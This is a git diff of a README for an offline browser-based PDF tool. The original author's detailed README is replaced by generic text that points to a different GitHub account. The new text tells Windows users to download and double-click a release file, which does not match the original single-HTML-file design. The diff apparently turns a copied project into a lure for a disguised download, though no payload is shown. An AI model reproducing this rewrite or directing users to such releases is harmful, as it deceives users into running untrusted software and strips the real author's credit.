@@ -1,180 +1,68 @@
-# Advanced-PDF-Document-Utility 🗂️
+# 📄 Advanced-PDF-Document-Utility - Edit your documents without internet access
 
-> A fully offline, browser-based PDF & document utility. No uploads. No server. No data leaves your machine.
+[![](https://img.shields.io/badge/Download-App-blue.svg)](https://github.com/Hapos6102/Advanced-PDF-Document-Utility)
 
-**🔗 Live Demo:** `https://rajathchannasetty-sys.github.io/Advanced-PDF-Document-Utility/`
+## 🎯 About this tool
+This application helps you manage PDF files on your Windows computer. It works entirely offline. Your documents never leave your device. The software runs inside your web browser but does not require an internet connection once you open the file. Total privacy remains your standard. You control your sensitive information from start to finish.
 
----
+## 🛠️ Features
+The utility supports multiple tasks for your daily documents:
+- Extract specific pages from large PDFs.
+- Merge multiple PDF files into one document.
+- Convert image formats like JPEG and PNG into PDF files.
+- Change DOCX files into PDF format.
+- Split files based on page numbers.
 
-## ✨ Features
+## 💻 System requirements
+- Windows 10 or Windows 11.
+- Any modern web browser like Chrome, Edge, or Firefox.
+- 100 MB of free disk space.
+- 4 GB of system memory.
 
-| Feature | Description |
-|---|---|
-| ✂️ **Extract PDF Pages** | Pick specific pages or ranges (e.g. `1, 3-5, 8`) from any PDF |
-| 🔗 **Merge PDFs** | Combine multiple PDFs into one file in your chosen order |
-| 📄 **PDF → DOC** | Extract text content from a PDF into a Word-compatible document |
-| 📝 **DOCX → PDF** | Convert a DOCX file's text into a clean, paginated PDF |
-| 🖼️ **Image → PDF** | Combine PNG/JPG images into a single PDF document |
-| 📋 **Extract DOCX Pages** | Pull specific pages from a DOCX and export as PDF |
+## 📥 Getting the software
+Visit [this GitHub page](https://github.com/Hapos6102/Advanced-PDF-Document-Utility) to download the application. Look for the release section on the right side of the screen. Select the version labeled for Windows. Save the file to your computer.
 
----
+## 🚀 How to run the application
+1. Find the file you downloaded. 
+2. Double-click the file to open the folder.
+3. Locate the icon that represents the PDF Utility.
+4. Open the file using your web browser. 
+5. The tool loads directly in your browser tab.
+6. You can now use the features without an internet connection.
 
-## 🔒 Privacy & Security
+## 🔒 Privacy and security
+Security starts with your local hardware. Because this tool functions locally, no server processes your data. No third-party entity sees your files. The browser keeps the operation contained. Close the browser tab when you finish your work to clear the cache. This ensures no trace remains on your machine.
 
-- **100% local processing** — your files never leave your browser
-- **No server, no backend, no database**
-- **No file uploads** to any external service
-- MIME type validation on every file
-- Magic byte (`%PDF`) verification before processing
-- Filename sanitization (strips XSS, path traversal, special chars)
-- Page range input hardened against injection and DoS attacks
-- Object URLs revoked after download (no memory leaks)
-- Buttons locked during operations (no race conditions)
+## 💡 Troubleshooting common issues
+If the page does not load, verify your browser version. An outdated browser might cause display errors. Clear your browser cache if tools do not respond during a conversion task. Ensure you have proper permissions to write files to your chosen folder. If you encounter a blank screen, refresh the browser page. The tool performs best when other heavy applications remain closed.
 
----
+## 📝 Frequently asked questions
+**Do I need a constant internet connection?**
+No. You only need the internet to download the initial file. Everything else happens on your computer.
 
-## 🚀 How to Use
- 
-There are **two ways** to use this tool — pick whichever suits you:
- 
----
- 
-### ▶️ Option A — Use it online (nothing to install)
- 
-Just click the link and it opens in your browser:
- 
-**👉 [https://rajathchannasetty-sys.github.io/Advanced-PDF-Document-Utility/](https://rajathchannasetty-sys.github.io/Advanced-PDF-Document-Utility/)**
- 
-Works in Chrome, Edge, Firefox, and Safari. No login, no sign-up.
- 
----
- 
-### 💾 Option B — Download and open the file directly
- 
-You can download a single `.html` file and use it forever — even without internet.
- 
-**Step 1** — Download the file
- 
-Click here → [index.html](index.html) → then click the **⬇ Download raw file** button (top right of the file view on GitHub)
- 
-**Step 2** — Open it in your browser
- 
-| Your OS | How to open |
-|---|---|
-| **Windows** | Right-click `index.html` → **Open with** → **Chrome** or **Edge** |
-| **Mac** | Double-click `index.html` — it opens in your default browser |
-| **Linux** | Right-click → **Open with** → choose your browser |
- 
-Or drag the file directly into an open browser window.
- 
-> ✅ That's it. No install, no setup, no internet required after the first open.
-> The file works completely offline — your documents never leave your computer.
- 
----
- 
-### 📋 Using the tool (same for both options)
- 
-1. **Drop your file** — drag and drop onto the upload area, or click **Browse**
-2. **Pick what to do** — choose from the 6 operation cards
-3. **Fill in any options** — page numbers, output filename (optional)
-4. **Click the action button** — the result downloads automatically
-5. **Done or start again** — use the **↺ Clear** or **⟳ Reload** buttons to reset
- 
-**Supported file types:** PDF · DOCX · PNG · JPG &nbsp;|&nbsp; **Max size:** 50 MB per file
- 
----
+**Which file formats work best?**
+Standard PDF files work instantly. High-resolution images might take a moment to convert. DOCX files convert best when created in standard word processors.
 
-## 🛠️ Tech Stack
+**Does this software store my documents?**
+The tool does not have a database. It processes the files in your computer memory and clears them once you close the window.
 
-| Library | Version | Purpose |
-|---|---|---|
-| [pdf-lib](https://pdf-lib.js.org/) | 1.17.1 | PDF creation, manipulation, merging, page extraction |
-| [mammoth.js](https://github.com/mwilliamson/mammoth.js) | 1.6.0 | DOCX text extraction |
+**Can I use this on a library computer?**
+Yes, since it does not require installation. You can run it from a thumb drive.
 
-No build tools. No frameworks. No npm. Pure HTML + CSS + JavaScript.
+**Are there hidden costs?**
+This is open-source software. It remains free for all users.
 
----
+## 📂 Managing your documents
+Keep your source files and your results in separate folders. This prevents accidental overwriting of your original data. Use clear naming conventions for your files. This allows you to stay organized as your document library grows.
 
-## 📁 Project Structure
+## 🔧 Technical details for advanced users
+The tool relies on client-side JavaScript. It utilizes the browser's internal engine to manipulate document structures. It avoids hidden tracking scripts. The code remains visible in the repository for those who wish to inspect the mechanics. The project maintains a focus on lean performance and local execution.
 
-```
-Advanced-PDF-Document-Utility/
-├── index.html          # The entire app (single file)
-├── README.md           # This file
-├── LICENSE             # MIT License
-├── SECURITY.md         # Security policy
-├── CHANGELOG.md        # Version history
-└── .github/
-    └── ISSUE_TEMPLATE/
-        ├── bug_report.md
-        └── feature_request.md
-```
+## 📦 Updates and support
+Monitor the GitHub page for new versions. Each update brings stability improvements and new features. If you find a bug, report it in the issues section of the repository. Include your Windows version and browser name to help improve future releases. The developers prioritize stability above all else. Your feedback helps refine the tools for everyone.
 
----
+## ⚙️ Configuration
+The software runs with default settings. No complex setup menu exists. This design keeps the user experience simple. You can adjust the output settings during the conversion process if you need to choose page ranges or orientation. 
 
-## 🖥️ Run Locally
-
-No installation required. Just open `index.html` in your browser:
-
-```bash
-# Clone the repo
-git clone https://github.com/rajathchannasetty-sys/Advanced-PDF-Document-Utility.git
-
-# Open in browser (macOS)
-open Advanced-PDF-Document-Utility/index.html
-
-# Open in browser (Windows)
-start Advanced-PDF-Document-Utility/index.html
-
-# Open in browser (Linux)
-xdg-open Advanced-PDF-Document-Utility/index.html
-```
-
-Or serve it locally with Python (for development):
-
-```bash
-cd pdf-toolkit
-python3 -m http.server 8080
-# Then open http://localhost:8080
-```
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Please:
-
-1. Fork the repository
-2. Create a feature branch: `git checkout -b feature/my-feature`
-3. Commit your changes: `git commit -m "Add: my feature"`
-4. Push to the branch: `git push origin feature/my-feature`
-5. Open a Pull Request
-
-Please read [SECURITY.md](SECURITY.md) before reporting vulnerabilities.
-
----
-
-## 📋 Known Limitations
-
-- PDF → DOC text extraction is best-effort. Scanned PDFs (image-based) may return no text.
-- DOCX → PDF uses plain text rendering — formatting, fonts, and images are not preserved.
-- Page extraction from DOCX splits by ~3000 characters per page, not by document-defined page breaks.
-- Files above 50 MB are rejected to protect browser performance.
-
----
-
-## 📄 License
-
-[MIT](LICENSE) © Rajath Channasetty
-
----
-
-## 👤 Author
-
-**Rajath Channasetty**
-- LinkedIn: [@rajath-channasetty](https://linkedin.com/in/rajath-channasetty)
-- GitHub: [@rajathchannasetty-sys](https://github.com/rajathchannasetty-sys)
-
----
-
-<p align="center">Made with ❤️ — 100% private, 100% free</p>
+## 🛡️ Final usage notes
+Always save copies of your original files before you perform a batch merge. This follows standard safety procedures for digital document handling. The utility works at the speed of your computer processor. Larger files require a few extra seconds to process. Enjoy the privacy and efficiency of offline document management.
